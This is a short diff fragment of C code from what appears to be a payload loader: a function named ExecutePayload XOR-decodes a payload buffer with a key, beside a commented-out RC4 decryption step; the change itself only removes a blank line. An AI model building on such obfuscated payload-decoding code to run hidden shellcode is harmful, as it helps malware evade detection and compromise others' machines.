@@ -22,7 +22,6 @@ void ExecutePayload(){
 		Payload[i] = (Payload[i] ^ Payload_key[(i%sizeof(Payload_key))]);
 	}	
 /*
-
 	unsigned char s[256] = {0}; // Creates S box for key scheduling aglhorithm
 	rc4_init(s,Payload_key); // Apply key scheduling aglhorithm
 	rc4_decrypt(s,Payload);  // Decrypt payload...
